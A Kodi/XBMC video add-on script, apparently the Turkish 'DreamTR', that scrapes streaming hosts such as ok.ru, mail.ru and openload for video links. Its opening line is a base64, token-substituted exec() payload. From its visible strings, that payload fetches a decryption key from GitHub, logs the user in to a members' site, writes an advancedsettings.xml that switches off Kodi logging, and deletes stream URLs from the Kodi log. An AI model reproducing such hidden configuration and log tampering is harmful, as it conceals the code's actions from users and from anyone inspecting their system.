exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MWNhIDE1NCw3YywzMCwzYyxmMwoxY2EgNGMsZGQsMTg0LDE2ZQoxY2EgMjAsIDEzLCA4MCwgM2YKMWNhIDI4CjFjYSAxNGEKMThjIDE5LjE5Yy4xMjMgMWNhIDhmCjFjYSA1OCw4YgoxY2EgMzAsIDhiLDE4ZgoxY2EgZDgKCjJiID0gMTU0LjJiCjFiZiA9IDE1NC4xYmYKZGEgPSB7JzMzLTM3JzogJzFiYy81LjAgKGZiOyA5YiA4NCkgZDEvMjYuMTEgKDI3LCAxZCAxOCkgMjIvMjMuMC5jNi42NCAxMC8yNi4xMScsCgknMTQzJzogJzNhLzE1LDE3LzMxKzE5LDE3LzE5OzU5PTAuOSwqLyo7NTk9MC44JywKCScxNDMtMTJiJzogJzFhMy0xNzktMSwxOTktODs1OT0wLjcsKjs1OT0wLjMnLAoJJzE0My0xYyc6ICc5NScsCgknMTQzLTFmJzogJzQ4LWEwLDQ4OzU5PTAuOCcsCgknMzInOiAnOTAtNjcnfSAgICAgICAgICAgCmY1ID0gJzFiYyUxYTYuMCslZWQlM2IrMWFmJTNiKzFhK2I1KzYuMSUzYis0OC1hMCUyOStkMSVlYS4wKyUxMWYlMmMrMWQrMTglMjkrMjIlMWE3LjAuMTk1LjM4KzEwJWVhLjAnCgoxYWQgPSA4MC4xNmMoMTNjPSIxNDIuOWQuMTY0IikKMWM3PSJ8MzMtMzc9MWJjLzUuMCAoZmI7IDliIDg0KSBkMS8yNi4xMSAoMjcsIDFkIDE4KSAyMi8yMy4wLmM2LjY0IDEwLzI2LjExJyksKCcxNDMnLCAnM2EvMTUsMTcvMzErMTksMTcvMTk7NTk9MC45LCovKjs1OT0wLjgnKSwoJzE0My0xYycsICc5NScpLCgnMTQzLTFmJywgJzQ4LWEwLDQ4OzU5PTAuOCcpLCgnMzInLCAnOTAtNjcnKSIKCgoxNzQ9JzI1PT0nCjE3NT0nYmUnCjE3Mz0nMTI9JwoKY2IgPSAxYWQuN2YKMTZmID0gMWFkLmQ3KCcxNmYnKQo2NiA9IDFhZC5jMCgnMzUnKQo1ZSA9IDIwLjFjZChkZC4zNS42ZCg2NiwgJzRmJywnMTNhJykpCjRjLjM1LjVjKDVlKQo4MiA9IDIwLjFjZChkZC4zNS42ZCg2NiwgJzRmJywgJzE3MicpKQo0Yy4zNS41Yyg4MikKNjEgPSAyMC4xY2QoZGQuMzUuNmQoNjYsICc0ZicsICcxOWYnKSkKNGMuMzUuNWMoNjEpCjExMz0xCjFjOT0nMWU6Ly8xM2IuY2YuMWM4JwpmPSIxZTovLzEzYi5mOS4xYTUvIgoxNjg9IjQzPT0iCjcxID0gMjAuMTRjKCkKNzEuMTdmKCkKMmYgPSAyMC4xMDIoMjAuOWYpCjJmLjE1ZigpCgoKMTRiIGExKDFjYyk6CiAgICAyZCA9IDE1NC4yYigxY2MpCiAgICAyZC5lKCczMy0zNycsICcxYmMvNS4wICgxYTsgMWFmOyAxYSBiNSA1LjE7IDQ4LTFjNjsgMWJkOjEuOS4wLjMpIDE4L2U5IDEyMi8zLjAuMycpCiAgICBiMiA9IDE1NC4xYmYoMmQpCiAgICAxND1iMi42OCgpCiAgICAxND0xNGEuZTEoMTQpCiAgICBiMi41MigpCiAgICAxY2UgMTQKCjE0YiAxM2YoOGUsIDFjYywgN2I9IiIpOgogICAgNjIgPSAxMy41NCg4ZSwgNGI9ImI0LmY3IiwgMTg2PTdiKQogICAgNjIuYTUoMTg5PSIxNjYiLCBkYz17IjE2ZCI6OGV9KQogICAgNjIuNjAoImU0IiwgIjE3MSIpCiAgICAzZi4xNTEoYmQ9MTMyKDRjLmMyWzFdKSwxY2M9MWNjLDFiPTYyLDg5PTFiMykKMTRiIDE0NCg4ZSwxY2MsYzMsN2UsYjYpOgogICAgMTkxPTRjLmMyWzBdKyI/MWNjPSIrN2MuNmIoMWNjKSsiJmMzPSIrMWEwKGMzKSsiJjhlPSIrN2MuNmIoOGUpCiAgICBhMj02ZgogICAgNjI9MTMuNTQoOGUsIDRiPSIxYjQuZjciLCAxODY9N2UpCiAgICA2Mi42MCgnY2MnLCBiNikKICAgIGEyPTNmLjE1MShiZD0xMzIoNGMuYzJbMV0pLDFjYz0xOTEsMWI9NjIsODk9NmYpCiAgICAxY2UgYTIKNjkgPSAoJzE4NS4xOTAvZTYvMTUyLzE4YS0xYmUtMTU5LzE0Ny8xOTMuODYuMWEyLy86MTc4JylbOjotMV0KMTQ9YTEoNjkpCjJlPTMwLjk2KCdbMWNiLTFjMV0nKS4xYzUoMTQpCgpiYyA9IDJlCgoxNGIgMTYwKDk4KToKICAgIDc4ID0gW10KICAgIDc3IDE3YSA1NiAxNTUoMTRmKDk4KSk6CiAgICAgICAgYTYgPSAxNDgoOThbMTdhXSkgXiAxNDgoYmNbMTdhICUgMTRmKGJjKV0pCiAgICAgICAgNzguNWMoMWFiKGE2KSkKICAgIDFjZSAnJy42ZCg3OCkKMTRiIDE3MCgpOgogICAgMjAuNDcoIjExNS5mNi4xMmUoMzUsNjUpIikKICAgIDIwLjQ3KCIxMTUuYTgoMThlKSIpCjE0YiAxMWIoKToKICAgIDVhPWRkLjM1LjZkKDYxLCcxYTguMWFjJykKICAgIDE3YiA9IDI4LmZkKCkKICAgIDhlPTFhZC5kNygiMTgxIikKICAgIGRmPTFhZC5kNygiODgiKQogICAgNTU9MWFkLmQ3KCI1NSIpCiAgICAxYjUgZmEgZGY6CiAgICAgICAgICAgIDFhZC5iZigpCiAgICA0NjoKICAgICAgICAgICAgY2UKICAgIDQyID0gMjguMTJjKDEyNz0yOC5hZSgpKQogICAgNDIuYjEoMTdiKQogICAgNDIuOGMoNmYpCiAgICA0Mi43Myg2ZikKICAgIDQyLjgxKDZmKQogICAgNDIuODcoMWIzKQogICAgNDIuN2QoMjguMTVkLjZlKCksIDEwZD0xKQogICAgNDIuZGUgPSBbKCczMy1lYicsICcxYmMvNS4wIChmYjsgOWIgODQpIGQxLzI2LjExICgyNywgMWQgMTgpIDIyLzIzLjAuYzYuNjQgMTAvMjYuMTEnKSwoJzE0MycsICczYS8xNSwxNy8zMSsxOSwxNy8xOTs1OT0wLjksKi8qOzU5PTAuOCcpLCgnMTQzLTFjJywgJzk1JyksKCcxNDMtMWYnLCAnNDgtYTAsNDg7NTk9MC44JyksKCczMicsICc5MC02NycpXQogICAgNDIuNmMoJzFlOi8vMTA3LjE0MC9lNS8nKQogICAgNDIuMTVlKCkKICAgIDQyLmQ2KDFiMD0wKQogICAgNDIuMTAxWycxMzcnXT0xYWQuZDcoIjg4IikKICAgIDQyLjEwMVsnMTkyJ109MWFkLmQ3KCI1NSIpCiAgICA0Mi4xMzYoKQogICAgMTU9NDIuYjIoKS42OCgpCiAgICAxYjUgIjEzOSIgNTYgMTU6CiAgICAgICAgICAgIDE2MiAiMTFkIgogICAgMTE4ICJkMiIgNTYgMTU6CiAgICAgICAgICAgIGI3ID0gMTMuNDkoKQogICAgICAgICAgICA0YSA9IDEzLmJhKCkKICAgICAgICAgICAgNGEuYTIoJ1tjIDE0ZV1hOSBjNSBjOFsvY10nLCdbYyA1ZF0xYWEuMTk3LjE2YiBjYSAxMmYgZjAuWy9jXScsJ1tjIDVkXTEyNCAxNjcgMTc3IDE4ZCBmMiA+IGJiQDE1Yy4xNDAgYSA5MyAxMzUgZmUgMWExIDExYyAxZTovLzEyZC4xODhbL2NdJykKICAgICAgICAgICAgNGMuMTAzKCkKCiAgICAxMTggIjEyMSAxMDkiIDU2IDE1OgogICAgICAgICAgICBiNyA9IDEzLjQ5KCkKICAgICAgICAgICAgNGEgPSAxMy5iYSgpCiAgICAgICAgICAgIDRhLmEyKCdbYyAxNGVdYTkgYzUgYzhbL2NdJywnW2MgNWRdMWFhLjE5Ny4xNmIgMTRkIDEyOCBmOCEhIVsvY10nLCdbYyA1ZF0xODcgMWFhLjE5Ny4xNmIgMTRkIDEzOCAxYjcgMWI2IDE0NiA3OSBlZiAxOTQgMTgwIDE1YSAxMGYhISEgMTMwIDEzZSBmYy5bL2NdJykKICAgICAgICAgICAgNGMuMTAzKCkKCiAgICAxY2UgMTUKCjE0YiBiOCgyZiw4ZSwxY2MpOgogICAgMWIgPSAxMy41NCg4ZSwgNGI9IjFiNC5mNyIsIDE4Nj0iIikKICAgIDFiLmE1KCc5ZCcsIHsnOGUnOiA4ZSB9ICkKICAgIDJmLjE5NigxY2MsMWI9MWIpCiAgICAxY2UgMmYKCjE0YiAxMTEoKToKICAgIDFiOCA9IDIwLjFjZCgnYWI6Ly8xMWUvMjAuMTM3JykKICAgIGYgPSA2YygxYjgsIjFiYiIpCiAgICBmMT0gIiIKICAgIDc3IDEwMCA1NiBmOgogICAgICAgICAgICBmMSArPTEwMAogICAgNDAgPSAzMC45NigiMWUuKyIpCiAgICA0MSA9IDMwLjk2KCIxN2QuKyIpCiAgICA5MiA9IDMwLjFjNSg0MCxmMSkKICAgIDkxID0gMzAuMWM1KDQxLGYxKQogICAgNzcgMTdhIDU2IDkyOiAgICAgICAKICAgICAgICAgICAgMWMzID0gNDAuY2QoJycsIGYxKQogICAgICAgICAgICBmPTZjKDFiOCAsIjFhNCIpICAgICAgICAKICAgICAgICAgICAgZi45YygxYzMpCiAgICA3NyBiIDU2IDkxOiAgIAogICAgICAgICAgICA4MyA9IDQxLmNkKCcnLCBmMSkKICAgICAgICAgICAgZj02YygxYjggLCIxYTQiKQkgICAgICAgIAogICAgICAgICAgICBmLjljKDgzKQogICAgZi4xNTYoKQogICAgZi41MigpCgoxNGIgZWMoKToKICAgIGZmPSc0ZT0nCiAgICAxNDk9JzI0PScKICAgIGUwID0gM2MuM2MoKQogICAgZTM9MjAuMWNkKCJhYjovLzY2LzEwYy8iKQogICAgOWEgPSA4ZigpCiAgICAxMGU9OWEuZDkKICAgIDFjNCA9IDlhLmFmKCI5NyIpCiAgICA5YS41ZigxYzQpCiAgICBhNCA9IDlhLjllKDE4NC43NCgxNDkpKQogICAgMWM0LjVmKGE0KQogICAgNWEgPSAxODQuNzQoZmYpCiAgICBmID0gNmMoZTMrNWEsICIxYTQiKQogICAgZi45YyhlMC4xMTQoMTBlKDEzZD0iIikpKQoKMTRiIGQ0KDE3ZSk6CiAgICAxN2U9MTdlLjY1KCdcXCcsICcnKQogICAgMWNlIDE3ZQoKMTRiIGIzKDFjYyk6CiAgICAyZCA9IDE1NC4yYigxY2MpCiAgICAyZC5lKCczMy1lYicsICcxYmMvNS4wICgxMGI7IDE1MCAxMDUgMTk4IDFkIDEzMSAxMDUgMWMwKSBkMS8xMzQuMS40ICgyNywgMWQgMTgpIGFkLzguMCBjNC8xNDUgMTAvMTM0LjEuNCcpLCgnMTQzJywgJzNhLzE1LDE3LzMxKzE5LDE3LzE5OzU5PTAuOSwqLyo7NTk9MC44JyksKCcxNDMtMWMnLCAnOTUnKSwoJzE0My0xZicsICc0OC1hMCw0ODs1OT0wLjgnKSwoJzMyJywgJzkwLTY3JykKICAgIGIyID0gMTU0LjFiZigyZCkKICAgIDE0PWIyLjY4KCkKICAgIGIyLjUyKCkKICAgIDFjZSAxNAoKIy0tLS0jCjE0YiA2MygxY2MsIDE2PXt9LCA4ZD0xMTksIDNkPTExOSk6CiAgICA0ND17JzE0Myc6ICczYS8xNSwxNy8zMSsxOSwxNy8xOTs1OT0wLjksZGIvMTA0LCovKjs1OT0wLjgnLAoJICcxNDMtMWMnOiAnMTA2LCBhMywgMTE2JywKCSAnMTQzLTFmJzogJzQ4LWEwLDQ4OzU5PTAuOCcsCgkgJzMzLTM3JzogJzFiYy81LjAgKDFhIGI1IDYuMTsgNmEpIGQxLzI2LjM2ICgyNywgMWQgMTgpIDIyLzUwLjAuMTdjLjk0IDEwLzI2LjM2J30KICAgIDJhPXsnMTQzJzogJzNhLzE1LDE3LzMxKzE5LDE3LzE5OzU5PTAuOSxkYi8xMDQsKi8qOzU5PTAuOCcsCgkgICAgICcxNDMtMWMnOiAnMTA2LCBhMywgMTE2JywKCSAgICAgJzE0My0xZic6ICc0OC1hMCw0ODs1OT0wLjgnLAoJICAgICAnMzMtMzcnOiAnMWJjLzUuMCAoMTBiOyAxNTAgMTA1IDFhOSAxZCAxMzEgMTA1IDFjMCkgZDEvMjYuNTEuMSAoMjcsIDFkIDE4KSBhZC83LjAgYzQvMTQxIDEwLzE4My41Myd9CgogICAgMWI1IDhkID09ICcxYjknOgogICAgICAgIDFiNSAxNjoKICAgICAgICAgICAgNDQuYjkoMTYpCiAgICAgICAgYjIgPSA1OC5mNCgxY2MsIDE2PTQ0LCAzZD0zZCwgYzk9MWIzKQogICAgNDY6CiAgICAgICAgMWI1IDE2OgogICAgICAgICAgICAyYS5iOSgxNikKICAgICAgICBiMiA9IDU4LmY0KDFjYywgMTY9MmEsIDNkPTNkLCBjOT0xYjMpCiAgICAxYjUgYjIuZDUgPT0gMTlkOgogICAgICAgIDFjZSBiMi4xMjYsIGIyLjEyNS4xMGEoKQogICAgNDY6CiAgICAgICAgY2UKIy0tIwozZSAJPSAnMWJjLzUuMCAoMWEgYjUgNi4zOyA2YSkgZDEvMjYuMzYgKDI3LCAxZCAxOCkgMjIvNDUuMC4xMTIuODUgMTAvMjYuMzYnCjc1IAkJPSAnM2EvMTUsMTcvMzErMTksMTcvMTk7NTk9MC45LCovKjs1OT0wLjgnCjE0YiAxMDgoMWNjLCA3YT0xYjMpOgogICAgMmQgPSAxNTQuMmIoMWNjKQogICAgMmQuZSgnMzMtMzcnLCAzZSkKICAgIDJkLmUoJzE0MycsIDc1KQogICAgMmQuZSgnMTYxLTEyOScsICcxYjEtZWUnKQogICAgYjIgPSAxNTQuMWJmKDJkKQogICAgNTcgPSBiMi42OCgpCiAgICBiMi41MigpCiAgICAxYjUgN2E6CiAgICAgICAgICAgIDM0ID0gYjIuMTYuZjQoJzE5YS03NicpCiAgICAgICAgICAgIDFjZSB7JzU3JzogNTcsICczNCc6IDM0fQogICAgMWNlIDU3CjE0YiBiMCgxY2MpOgogICAgMWNhIDMwLCAxNTQKICAgIDE0YiBjMSgxY2MpOgogICAgICAgIDE4YiA9IDMwLjViKCcxZTovLy4rPzkzXC5lNy4rPzwxNTguKz8xNWI9XCIxMTc9KD8xNmI8MWNjPlteXCJdKyknLCAxY2MsIDMwLjcwIHwgMzAuZDApCiAgICAgICAgMTgyID0gMzAuNWIoJzovLzlkLis/XC45M1wuZTdcLyg/MTZiPDFjYz4uKz8pXC4xNScsIDFjYywgMzAuNzAgfCAzMC5kMCkKICAgICAgICAxY2UgMThiIDFiMiAxODIKICAgIDE5YiA9IGMxKDFjYykKICAgIDIxID0gJycKICAgIDE2OSA9IFtdCiAgICAxYjUgMTliOgogICAgICAgIDIxID0gMTliLmU4KCcxY2MnKQogICAgICAgIDIxID0gMzAuY2QoJ1wmW14kXSonLCcnLDIxKQogICAgICAgIDIxID0gMzAuY2QoJy8xNTMnLCcnLDIxKQogICAgICAgIDIxID0gJzFlOi8vMTEwLjFjMi45My5lNy8nICsgMjEgKyAnLjhiJwogICAgNDY6CiAgICAgICAgOGEsIDM0ID0gNjMoMWNjKQogICAgICAgIDJlID0gMzAuOTYoJyJkMyI6IiguKj8pIiwnKS4xYzUoOGEpCiAgICAgICAgMWI1ICcxZScgZmEgNTYgMmVbMF06CiAgICAgICAgICAgIDIxID0gJzFlOicgKyAyZVswXQogICAgICAgIDQ2OgogICAgICAgICAgICAyMSA9IDJlWzBdCgogICAgMWI1IDIxOgogICAgICAgIDhhLCAzNCA9IDYzKDIxKQogICAgICAgIGM3ID0gMzRbJzRkJ10KICAgICAgICAxMWEgPSA4Yi4xNmEoOGEpCiAgICAgICAgNzcgMTY1IDU2IDExYVsxOTEnMTMzJ106CiAgICAgICAgICAgIGFhID0gMTY1WydiYyddCiAgICAgICAgICAgIDFiNSAnMWUnIGZhIDU2IDE2NVsnMWNjJ11bMDo0XToKCSAgICAgMTQgPSAnMWU6JyArIDE2NVsnMWNjJ10gKyAnfDc2PScgKyAxNTQuZTIoJzRkPScgKyBjNykjICsgJ3xhYz0nICsgMWNjCgkgICAgIDFjYz0xNCAKICAgICAgICAgICAgNDY6CgkgICAgIDE0ID0gMTY1WycxY2MnXSArICd8NzY9JyArIDE1NC5lMignNGQ9JyArIGM3KSMgKyAnfGFjPScgKyAxY2MKCSAgICAgMWNjPTE0CiAgICAgICAgICAgIDhlPWFhCiAgICAgICAgICAgIDEzZig4ZSwxY2MsJycpCiMtLSMKMTRiIDE1NygxY2MpOgogICAgM2UgCT0gJzFiYy81LjAgKDFhIGI1IDYuMzsgNmEpIGQxLzI2LjM2ICgyNywgMWQgMTgpIDIyLzQ1LjAuMTEyLjg1IDEwLzI2LjM2JwogICAgNzUgCQk9ICczYS8xNSwxNy8zMSsxOSwxNy8xOTs1OT0wLjksKi8qOzU5PTAuOCcKICAgIDEyMCA9IFtdCiAgICAxYjUoMzAuNWIoMWJiJ2EyLmU3JywgMWNjKSk6CiAgICAgICAgICAgIDEzYyA9IDMwLjViKCdcZCsnLCAxY2MpLmU4KDApCiAgICAgICAgICAgIGE3ID0gJzFlOi8vYTIuZTcvMWJhPzFhZT03MiYxOWU9JyArIDEzYwogICAgICAgICAgICAxY2M9YTcKICAgICAgICAgICAgMmQgPSAxNTQuMmIoMWNjKQogICAgICAgICAgICAyZC5lKCIzMy0zNyIsIjFiYy81LjAgKDFhIGI1IDYuMjsgNmEpIGQxLzI2LjM2ICgyNywgMWQgMTgpIDIyLzM5LjAuMTc2Ljk5IDEwLzI2LjM2IikKICAgICAgICAgICAgYjIgPSAxNTQuMWJmKDJkKQogICAgICAgICAgICAxND1iMi42OCgpCiAgICAgICAgICAgIGIyLjUyKCkKICAgICAgICAgICAgMmU9MzAuOTYoJyI4ZSI6IiguKj8pIiwiMWNjIjoiKC4qPykiJykuMWM1KDE0KQogICAgICAgICAgICA3NyA4ZSwxY2MgNTYgMmU6CgkgICAgIDFiNSAiMTJhIiA1NiA4ZToKCSAgICAgICAgICAgICBjZQoJICAgICA0NjoKCSAgICAgICAgICAgICAxY2M9MWNjLjY1KCdcXDE2MycsJyYnKQoJICAgICAgICAgICAgIDEzZig4ZSwxY2MsJycp")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|2|3|4|5|6|7|8|9|a|b|COLOR|d|add_header|f|Safari|11|LDE4OQlrazgvaEooPT5VQS1WPj1kKyUnZTsgKj0gPmdDLDR3Ly1SKSYpXw4|xbmcgui|link|html|headers|application|Gecko|xml|Windows|listitem|Encoding|like|http|Language|xbmc|vurl|Chrome|23|PGxvZ2xldmVsIGhpZGU9InRydWUiPi0xPC9sb2dsZXZlbD4|LDE4OQlrazgvaEooPT5VQS1WPj1kKyUnZScjLC0rYjlbNA|537|KHTML|mechanize|29|mobile_headers|Request|2C|req|match|playList|re|xhtml|Connection|User|cookie|path|36|Agent|38|39|text|3B|HTMLParser|params|USER_AGENT|xbmcplugin|patFinder1|patFinder2|br|aHR0cDovL2ZpbG1pemxlODAuY29tLw|pc_headers|45|else|executebuiltin|en|DialogProgress|dialog1|iconImage|sys|video_key|YWR2YW5jZWRzZXR0aW5ncy54bWw|resources|50|51|close|53|ListItem|password|in|source|requests|q|filepath|search|append|yellow|IMAGES_PATH|appendChild|setProperty|folders|liz|url_get|64|replace|home|alive|read|bilinmeyen|WOW64|quote_plus|open|join|HTTPRefreshProcessor|True|IGNORECASE|xbmcPlayer|videoPlayerMetadata|set_handle_redirect|b64decode|ACCEPT|Cookie|for|output|GoruyorsanizYanlis|getCookie|thumbnail|urllib|set_handle_refresh|iconimage|getLocalizedString|xbmcaddon|set_handle_referer|SUBS_PATH|subFound2|x86_64|85|tnetnocresubuhtig|set_handle_robots|Username|isFolder|resp|json|set_handle_equiv|computer|name|Document|keep|findPat2|findPat1|mail|94|none|compile|advancedsettings|input|99|doc|Linux|write|video|createTextNode|PLAYLIST_VIDEO|US|get_url|ok|deflate|veri_ad|setInfo|xor_num|jsonUrl|ActivateWindow|DreamTR|quality|special|Referer|Version|RobustFactory|createElement|MailRu_Player|set_cookiejar|response|get_urlmobile|DefaultVideo|NT|fanart|dialog|playlist_yap|update|Dialog|dreamtrdream|key|handle|LDE4OQlrazgvaEooPT5VQS1WPj1kKyUnZSwpOSkkImdDLDR3PCRUIhclVw56|openSettings|getAddonInfo|_regex|argv|mode|Mobile|Uyelik|1271|vkey|Hatasi|verify|Uyeliginizin|__language__|fanart_image|sub|pass|paradisehill|DOTALL|AppleWebKit|ucretsizuye|metadataUrl|replace_fix|status_code|select_form|getSetting|urlresolver|toprettyxml|openloadhdr|image|infoLabels|os|addheaders|login|htmlp|decode_fix|quote|pfile|IsPlayable|gizligiris|neyemnilib|ru|group|2008092417|2F532|agent|playlist2|28Windows|transform|Kullanici|dolmustur|strToSearch|isminizle|cookielib|get|UserAgent|Container|png|Gerekiyor|tekparthd|not|X11|Deneyiniz|CookieJar|AYRINTILI|test|line|form|PlayList|exit|webp|OS|gzip|denesine|http_req|username|get_dict|iPad|userdata|max_time|renk|Girdiniz|videoapi|playlist|2454|insidans|unescape|XBMC|sdch|movieSrc|elif|None|item|sifre100|BILGILER|DREAMTR|logpath|28KHTML|sources|Invalid|Firefox|minidom|Detayli|cookies|content|factory|Olmaniz|Control|profile|Charset|Browser|dreamtr|Refresh|suresi|Lutfen|Mac|int|videos|600|atiniz|submit|log|Iseniz|VIPuye|images|www|id|indent|Tekrar|addLink|com|11A465|plugin|Accept|addDir|12B411|Mesaji|rtidok|ord|nos|fix|def|Player|Uye|red|len|CPU|addDirectoryItem|retsam|embed|urllib2|range|flush|ok_ru|param|cigam|Sifre|value|gmail|_http|title|clear|angel|Cache|print|u0026|dreAM|v|Video|bilgi|sinem|items|loads|P|Addon|Title|time|downloadFolder|EXIT|true|subs|web4|web1|web2|2171|icin|ptth|8859|i|cj|2661|rtmp|x|stop|veya|Name|m2|9537|base64|lmth|thumbnailImage|Eger|club|type|maet|m1|from|Nick|Home|math|tset|u|pwd|moc|adi|195|add|I|8_1|utf|Set|m|dom|200|mid|lib|str|TUM|war|ISO|w|org|2F5|2F3|nfo|7_0|V|chr|txt|__settings__|cmd|U|nr|no|or|False|DefaultFolder|if|Bu|ve|log_path|PC|dk|r|Mozilla|rv|rt|urlopen|X|L3|my|subFound|liste|findall|GB|tk|tv|z|import|D|url|translatePath|return".split("|")))


































































































































































#--
def playerdenetle(name, urlList):
    value=[]
    for url in urlList if not isinstance(urlList, basestring) else [urlList]:
            if "mail.ru" in url:
                    magix_player(name,url) 
    if  value:
            return value
#--
def name_fix(x):        
    x=x.replace('-',' ').replace('_',' ')
    return x[0].capitalize() + x[1:]


#41 
def VIDEOLINKS1(name,url):
    xbmcPlayer = xbmc.Player()
    playList = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
    urlList=[]
    playList.clear()
    link=get_url(url)
    matchOK=re.compile('\/live\/(.*?)"').findall(link)
    for url in matchOK:
        url=url.replace('#038;','')
        url='http://embedlive.flexmmp.com/live/'+url
        link=get_url(url)
        match2=re.compile('src: "(.*?)"').findall(link)
        for url in match2:
            url=url.replace('&amp;', '&').replace('&#038;', '&').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/') 
            xbmcPlayer = xbmc.Player()
            playList = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
            playList.clear()
            addLink('[COLOR blue]'+'RETURN List <<'+' [/COLOR]','','http://png-4.findicons.com/files/icons/1714/dropline_neu/128/edit_undo.png')
            listitem = xbmcgui.ListItem(name)
            playList.add(url, listitem)
            xbmcPlayer.play(playList)
            exec_version = float(str(xbmc.getInfoLabel("System.BuildVersion"))[0:4])
            if exec_version < 14.0:
                playlist()
            else:
                playlist2()
    ply=re.compile('\/player\/url\/(.*?)"').findall(link)
    for name in ply:
        name=base64.b64decode(name)
        reverseName=""
        for x in range(len(name)-1,-1,-1):
            reverseName+=name[x]
            reverseName=base64.b64decode(reverseName)
            reverseName=reverseName.replace('ok/','')
            url=reverseName
            url = 'http://ok.ru/videoembed/'+str(url).encode('utf-8', 'ignore')
            ok_ru(url)
    ply1=re.compile("videoseyredin.net/embed/(.*?)'").findall(link)
    for name in ply1:
        name='https://www.videoseyredin.net/embed/'+name
        link=get_url(name)
        match1=re.compile('https:\/\/cdn2.videoseyredin.net\/(.*?).mp4').findall(link)
        for url in match1:
            url='https://cdn2.videoseyredin.net/'+url+'.mp4'
            name=url
            name=name.replace('https://cdn2.videoseyredin.net/','').replace('/',' ').replace('.mp4','')
            name="[COLOR orange]Kalite SEC > [/COLOR]"+name
            if "err" in name:
                pass
            else:
                addLink('[COLOR beige][COLOR orange]>[/COLOR]'+name+'[/COLOR]',url,'')
        
    ply2=re.compile('src\="https://openload.co/embed/(.*?)"').findall(link)
    for name in ply2:
        name='https://openload.co/embed/'+name
        url=name
        magix_player(name,url)
    mega2=re.compile('http:\/\/videomega.tv\/view.php\?ref\=(.*?)\&.*?').findall(link)
    for url in mega2:
        url='http://videomega.tv/view.php?ref='+url
        magix_player(name,url)
    cldy=re.compile('cloudy.ec\/embed.php\?id\=(.*?)"').findall(link)
    for url in cldy:
        url='https://www.cloudy.ec/embed.php?id='+url
        magix_player(name,url)
    cldy1=re.compile('cloudy.ec\/embed.php\?id\=(.*?)&').findall(link)
    for url in cldy1:
        url='https://www.cloudy.ec/embed.php?id='+url
        magix_player(name,url)
    vidag=re.compile('vid.ag\/embed\-(.*?)\.html"').findall(link)
    for url in vidag:
        url='http://vid.ag/embed-'+url+'.html'
        magix_player(name,url)
    mega=re.compile('\videomega.tv\/(.*?)\&amp;width.*?"').findall(link)
    for url in mega:
        url='http://videomega.tv/'+str(url).encode('utf-8', 'ignore')
        magix_player(name,url)
    opn=re.compile('src="https://openload.co/embed/(.*?)/"').findall(link)
    for url in opn:
        url='https://openload.co/embed/'+url+'/'
        magix_player(name,url)
    mlr=re.compile('\/videos\/embed\/mail\/(.*?)\.html').findall(link)
    for url in mlr:
        url='http://videoapi.my.mail.ru/videos/embed/mail/'+url+'.html'
        magix_player(name,url)
    link=link.replace('&amp;', '&').replace('&#038;', '&').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/')
    ok=re.compile('ok.ru\/videoembed\/(.*?)"').findall(link)
    for url in ok:
        url = 'http://ok.ru/videoembed/'+str(url).encode('utf-8', 'ignore')
        ok_ru(url)
    ok_9=re.compile('ok.php\?vid\=(.*?)"').findall(link)
    for url in ok_9:
        url = 'http://ok.ru/videoembed/'+str(url).encode('utf-8', 'ignore')
        ok_ru(url)
    vk_2=re.compile('vk.com\/(.*?)"').findall(link)
    for url in vk_2:
        url = 'http://vk.com/'+str(url).encode('utf-8', 'ignore')
        magix_player(name,url)
    vk_3=re.compile('rc="http://snnyk.com/(.*?)"').findall(link)
    for url1 in vk_3:
        url1=url1.replace('&amp;', '&').replace('&#038;', '&').replace('%3A',':').replace('%2F','/').replace('%3F','?').replace('%3D','=').replace('%26','&').replace('%2F','/')
        url1 = 'http://snnyk.com/'+str(url1).encode('utf-8', 'ignore')
        link=get_url(url1)
        vkvk=re.compile('param\[5\] \+ \'(.*?)\' \+ param\[6\] \+ \'(.*?)\' \+ param\[7\] \+ \'(.*?)\' \+').findall(link)
        for oid,vidid,has in vkvk:
            url='https://api.vk.com/method/video.getEmbed?oid='+oid+'&video_id='+vidid+'&embed_hash='+has
            magix_player(name,url)
    youtube=re.compile('\youtube\.com\/embed\/(.*?)\"').findall(link)
    for url in youtube:
        url = 'http://www.youtube.com/embed/'+str(url).encode('utf-8', 'ignore')
        magix_player(name,url)
    mailru2=re.compile('\/\/videoapi.my.mail.ru\/videos\/embed\/mail\/(.*?).html').findall(link)
    for mailrugelen in mailru2:
        url = 'http://videoapi.my.mail.ru/videos/embed/mail/'+mailrugelen+'.html'
        magix_player(name,url)
    mailru3=re.compile('http://api.video.mail.ru/videos/embed/mail/(.*?).html').findall(link)
    for mailrugelen in mailru3:
        url = 'http://videoapi.my.mail.ru/videos/embed/mail/'+mailrugelen+'.html'
        magix_player(name,url)
    dm=re.compile('www.dailymotion.com/embed/video/(.*?)\?').findall(link)
    for url in dm:
        url = 'http://www.dailymotion.com/embed/video/'+url
        magix_player(name,url)
    if not urlList:
        match=re.compile('flashvars="file=(.*?)%3F.*?" />').findall(link)
        if match:
            for url in match:
                VIDEOLINKS1(name,url)
    if urlList:
        Sonuc=playerdenetle(name, urlList)
        for name,url in Sonuc:
            listitem = xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage='')
            listitem.setInfo('video', {'name': name } )
            playList.add(url,listitem=listitem)
        xbmcPlayer.play(playList)
#--
#107
def radyocal(url):
    name=''
    link=get_url(url)
    match93=re.compile('"http\:\/\/(.*?)\.m3u8(.*?)"').findall(link)
    for a,b in match93:
        url='http://'+a+'.m3u8'+b+tk
        xbmcPlayer = xbmc.Player()
        playList = xbmc.PlayList(xbmc.PLAYLIST_VIDEO)
        playList.clear()
        addLink('[COLOR blue]'+'RETURN List <<'+' [/COLOR]','','http://png-4.findicons.com/files/icons/1714/dropline_neu/128/edit_undo.png')
        listitem = xbmcgui.ListItem(name)
        playList.add(url, listitem)
        xbmcPlayer.play(playList)
        exec_version = float(str(xbmc.getInfoLabel("System.BuildVersion"))[0:4])
        if exec_version < 14.0:
            playlist()
        else:
            playlist2()
    match94=re.compile('style\="width.*?" src\="(.*?)">').findall(link)
    for url in match94:
        if ".gif" in url:
            pass
        else:
            xbmcPlayer = xbmc.Player()
